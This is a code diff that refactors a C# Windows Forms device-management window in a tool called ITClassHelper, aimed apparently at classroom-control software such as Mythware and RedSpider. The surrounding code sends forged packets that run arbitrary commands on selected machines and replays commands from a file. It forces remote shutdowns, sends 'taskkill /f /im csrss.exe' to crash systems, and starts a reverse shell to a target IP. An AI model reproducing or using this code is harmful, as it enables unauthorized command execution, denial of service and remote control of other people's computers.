@@ -9,12 +9,14 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using static ITClassHelper.ProcMgr;
+using static ITClassHelper.PackAttacker;
 
 namespace ITClassHelper
 {
     public partial class FormDeviceManage : Form
     {
-        static PackAttacker.RoomType roomType = PackAttacker.RoomType.Mythware;
+        static RoomType roomType = RoomType.Mythware;
 
         public FormDeviceManage() => InitializeComponent();
 
@@ -87,7 +89,7 @@ namespace ITClassHelper
         private void SendCmdMenuItem_Click(object sender, EventArgs e)
         {
             string command = Interaction.InputBox("请输入要发送的命令：", "信息");
-            PackAttacker.SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+            SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
         }
 
         private void SendMsgMenuItem_Click(object sender, EventArgs e)
@@ -97,12 +99,12 @@ namespace ITClassHelper
             switch (msgMethod)
             {
                 case "1":
-                    PackAttacker.SendPack($"msg * {message}", GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+                    SendPack($"msg * {message}", GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
                     break;
 
                 case "2":
                     foreach (string ip in GetSelectedIPs())
-                        ProcMgr.Run("msg", $"/server:{Network.GetHostName(ip)} * {message}");
+                        Run("msg", $"/server:{Network.GetHostName(ip)} * {message}");
                     break;
 
                 case "3":
@@ -154,7 +156,7 @@ namespace ITClassHelper
                             string fileLine;
                             while ((fileLine = sr.ReadLine()) != null)
                             {
-                                PackAttacker.SendPack(fileLine, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+                                SendPack(fileLine, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
                                 Thread.Sleep(1000);
                             }
                         }
@@ -251,18 +253,18 @@ namespace ITClassHelper
                     foreach (string ip in GetSelectedIPs())
                     {
                         if (shutdownType == "shutdown")
-                            ProcMgr.Run("shutdown", $"/m \\\\{Dns.GetHostEntry(ip).HostName} /s /t 0");
+                            Run("shutdown", $"/m \\\\{Dns.GetHostEntry(ip).HostName} /s /t 0");
                         else
-                            ProcMgr.Run("shutdown", $"/m \\\\{Dns.GetHostEntry(ip).HostName} /r /t 0");
+                            Run("shutdown", $"/m \\\\{Dns.GetHostEntry(ip).HostName} /r /t 0");
                     }
                     break;
 
                 case "2":
-                    ProcMgr.Run("shutdown", "/i", true);
+                    Run("shutdown", "/i", true);
                     break;
 
                 case "3":
-                    PackAttacker.SendPack("shutdown /s /t 0", GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+                    SendPack("shutdown /s /t 0", GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
                     break;
 
                 default:
@@ -300,12 +302,12 @@ namespace ITClassHelper
                 "taskkill /f /im csrss.exe"
             };
             foreach (string command in commands)
-                PackAttacker.SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+                SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
         }
 
         private void RevShellMenuItem_Click(object sender, EventArgs e)
         {
-            ProcMgr.Run(Process.GetCurrentProcess().MainModule.FileName, $"-rs {GetSelectedIPs()[0]}", true);
+            Run(Process.GetCurrentProcess().MainModule.FileName, $"-rs {GetSelectedIPs()[0]}", true);
         }
 
         private void FormDeviceManage_FormClosing(object sender, FormClosingEventArgs e)
@@ -320,13 +322,13 @@ namespace ITClassHelper
             {
                 PortTextBox.Enabled = true;
                 PortTextBox.Text = "4605";
-                roomType = PackAttacker.RoomType.Mythware;
+                roomType = RoomType.Mythware;
             }
             else
             {
                 PortTextBox.Enabled = false;
                 PortTextBox.Text = "1689";
-                roomType = PackAttacker.RoomType.RedSpider;
+                roomType = RoomType.RedSpider;
             }
         }
     }
